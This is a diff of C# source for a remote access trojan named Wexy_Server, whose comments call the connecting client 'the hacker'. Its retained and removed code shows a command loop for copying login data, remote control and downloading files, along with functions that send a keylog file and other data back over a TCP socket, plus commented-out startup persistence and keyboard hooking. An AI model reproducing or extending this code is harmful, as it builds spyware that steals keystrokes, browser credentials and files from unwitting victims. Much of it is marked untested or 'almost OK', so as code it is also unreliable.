@@ -31,7 +31,6 @@ namespace Wexy_Server
             //Infinite loop 
             while (true)
             {
-                //try to read the data from the client(the hacker)
                 Thread.Sleep(10);
                 try
                 {
@@ -105,18 +104,9 @@ namespace Wexy_Server
                             openApp(appName);
                             break;
 
-                        case "show":
-                            //Sending pending data
-                            SendPendingData();
-                            break;
                         case "getos":
                             //Get the OS Version
                             getOSVersion();
-                            break;
-
-                        case "ischruser":
-                            //Tell if the user has a google chrome user profile
-                            isChromeUser();
                             break;
 
                         case "copylogindata":
@@ -136,10 +126,6 @@ namespace Wexy_Server
 
                         case "killwexy":
                             KillWexy();
-                            break;
-
-                        case "getkeylogs":
-                            GetKeyLogsFile();
                             break;
 
                         case "remote":
@@ -163,19 +149,6 @@ namespace Wexy_Server
             WebClient wb = new WebClient();
             wb.DownloadFile(url, fileName);
             
-        }
-
-        // - ALMOST OK -
-        public static void GetKeyLogsFile()
-        {
-            if (File.Exists("C:/users/" + Environment.UserName + "/desktop/wexylogs.txt"))
-            {
-                string filepath = "C:/users/" + Environment.UserName + "/desktop/wexylogs.txt";
-                FileInfo fileInfo = new FileInfo(filepath);
-                Stream s = client.GetStream();
-                byte[] filebytes = File.ReadAllBytes(filepath);
-                s.Write(filebytes, 0, filebytes.Length);
-            }
         }
 
         // - ALMOST OK - [NOT TESTED YET] 
@@ -209,20 +182,7 @@ namespace Wexy_Server
             byte[] filebytes = File.ReadAllBytes(filePath);
             s.Write(filebytes, 0, filebytes.Length);
         }
-        
-        // - ALMOST OK - 
-        public static void isChromeUser()
-        {
-            
-            while (Directory.Exists("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default"))
-            {
-                string response = "not user";
-                byte[] Packet = Encoding.ASCII.GetBytes(response);
-                Writer.Write(Packet, 0, Packet.Length);
-                Writer.Flush();
-                break;
-            }
-        }
+       
         // - ALMOST OK - 
         public static void getOSVersion()
         {
@@ -292,30 +252,6 @@ namespace Wexy_Server
                 Writer.Write(Packet, 0, Packet.Length);
                 Writer.Flush();
             }           
-        }
-
-        // - ALMOST OK - 
-        public static void SendPendingData()
-        {
-            try
-            {
-                string nothing = "";
-
-                //Creates a packet to hold the command, and gets the bytes from the string variable
-                byte[] Packet = Encoding.ASCII.GetBytes(nothing);
-
-                //Send the command over the network
-                Writer.Write(Packet, 0, Packet.Length);
-
-                //Flush out any extra data that didnt send in the start.
-                Writer.Flush();
-            }
-            catch
-            {
-                Console.WriteLine("client disconnected from server!");
-                Console.ReadKey();
-                Writer.Close();
-            }
         }
 
         // - ALMOST OK - [Multiple blank lines generated after the Computer name is received.]
@@ -467,9 +403,6 @@ namespace Wexy_Server
             
             //addToStartup();
             //alertAttacker();
-            //_hookID = SetHook(_proc);
-            //Application.Run();
-            //UnhookWindowsHookEx(_hookID); 
 
             listenner = new TcpListener(IPAddress.Any, port);
             listenner.Start();
